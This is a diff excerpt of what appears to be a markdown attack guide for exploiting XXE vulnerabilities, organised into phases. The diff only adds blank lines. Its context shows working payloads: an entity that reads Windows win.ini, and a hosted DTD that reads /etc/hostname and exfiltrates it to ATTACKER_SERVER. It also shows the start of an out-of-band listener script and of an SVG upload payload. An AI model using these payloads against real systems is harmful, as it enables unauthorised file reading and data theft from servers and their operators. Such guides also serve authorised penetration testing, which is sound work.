@@ -20,6 +20,7 @@ Exploit XML parsing vulnerabilities to read local files, perform SSRF, or exfilt
 ### Phase 1: Identify XML Processing
 
 Look for endpoints accepting:
+
 - `Content-Type: application/xml` or `text/xml`
 - SOAP endpoints (`.asmx`, `.wsdl`)
 - File upload accepting SVG, DOCX, XLSX, PPTX
@@ -37,6 +38,7 @@ Look for endpoints accepting:
 ```
 
 **Windows targets:**
+
 ```xml
 <!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">
 ```
@@ -53,6 +55,7 @@ Look for endpoints accepting:
 ```
 
 **Hosted DTD (xxe.dtd):**
+
 ```xml
 <!ENTITY % file SYSTEM "file:///etc/hostname">
 <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://ATTACKER_SERVER/?data=%file;'>">
@@ -61,6 +64,7 @@ Look for endpoints accepting:
 ```
 
 Use an OOB listener for callback detection:
+
 ```bash
 # Start an OOB listener — logs every inbound request to xxe_hits.json
 python3 - <<'PY' &
@@ -93,6 +97,7 @@ PY
 ### Phase 4: XXE via File Upload
 
 **SVG:**
+
 ```xml
 <?xml version="1.0"?>
 <!DOCTYPE svg [
